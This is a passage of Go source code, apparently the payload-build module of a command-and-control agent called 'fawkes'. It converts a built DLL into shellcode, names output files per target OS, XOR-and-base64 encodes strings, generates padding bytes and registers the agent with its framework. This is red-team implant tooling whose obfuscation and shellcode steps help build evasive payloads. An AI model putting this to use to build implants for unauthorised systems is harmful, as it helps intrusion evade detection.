			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildMessage = fmt.Sprintf("Failed to convert DLL to shellcode: %v", err)
			payloadBuildResponse.BuildStdErr += fmt.Sprintf("\nShellcode conversion error: %v", err)
		} else {
			payloadBuildResponse.Payload = &shellcode
			payloadBuildResponse.Success = true
			payloadBuildResponse.BuildMessage = "Successfully built shellcode payload!"
			// Set proper file extension
			extension := "bin"
			filename := fmt.Sprintf("fawkes.%s", extension)
			payloadBuildResponse.UpdatedFilename = &filename
		}
	} else {
		payloadBuildResponse.Payload = &payloadBytes
		payloadBuildResponse.Success = true
		payloadBuildResponse.BuildMessage = "Successfully built payload!"
		// Set proper file extension based on mode
		extension := "bin"
		if mode == "shared" {
			if targetOs == "windows" {
				extension = "dll"
			} else if targetOs == "darwin" {
				extension = "dylib"
			} else {
				extension = "so"
			}
		} else {
			// default-executable mode
			if targetOs == "windows" {
				extension = "exe"
			} else {
				extension = "bin"
			}
		}
		filename := fmt.Sprintf("fawkes.%s", extension)
		payloadBuildResponse.UpdatedFilename = &filename
	}

	//payloadBuildResponse.Status = agentstructs.PAYLOAD_BUILD_STATUS_ERROR
	return payloadBuildResponse
}

// extractLdflagValue extracts the value of a variable from ldflags string.
func extractLdflagValue(ldflags, pkg, varName string) string {
	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
	idx := strings.Index(ldflags, prefix)
	if idx < 0 {
		return ""
	}
	start := idx + len(prefix)
	end := strings.Index(ldflags[start:], "'")
	if end < 0 {
		return ""
	}
	return ldflags[start : start+end]
}

// xorEncodeString XOR-encodes a plaintext string with the given key and returns base64.
func xorEncodeString(plaintext string, key []byte) string {
	if len(key) == 0 || plaintext == "" {
		return plaintext
	}
	data := []byte(plaintext)
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(result)
}

// parseInflateHexBytes parses a comma-separated hex byte string like "0x41,0x42" or "0x90"
// into a byte slice. Returns an error if any part is not a valid hex byte.
func parseInflateHexBytes(hexStr string) ([]byte, error) {
	hexParts := strings.Split(hexStr, ",")
	var pattern []byte
	for _, part := range hexParts {
		part = strings.TrimSpace(part)
		part = strings.TrimPrefix(part, "0x")
		part = strings.TrimPrefix(part, "0X")
		val, err := strconv.ParseUint(part, 16, 8)
		if err != nil {
			return nil, fmt.Errorf("invalid hex byte '%s': %v", part, err)
		}
		pattern = append(pattern, byte(val))
	}
	return pattern, nil
}

// generatePaddingData repeats a byte pattern count times to create padding data.
func generatePaddingData(pattern []byte, count int) []byte {
	data := make([]byte, 0, len(pattern)*count)
	for i := 0; i < count; i++ {
		data = append(data, pattern...)
	}
	return data
}

func Initialize() {
	agentstructs.AllPayloadData.Get("fawkes").AddPayloadDefinition(payloadDefinition)
	agentstructs.AllPayloadData.Get("fawkes").AddBuildFunction(build)
	agentstructs.AllPayloadData.Get("fawkes").AddIcon(filepath.Join(".", "fawkes", "agentfunctions", "fawkes.svg"))
}

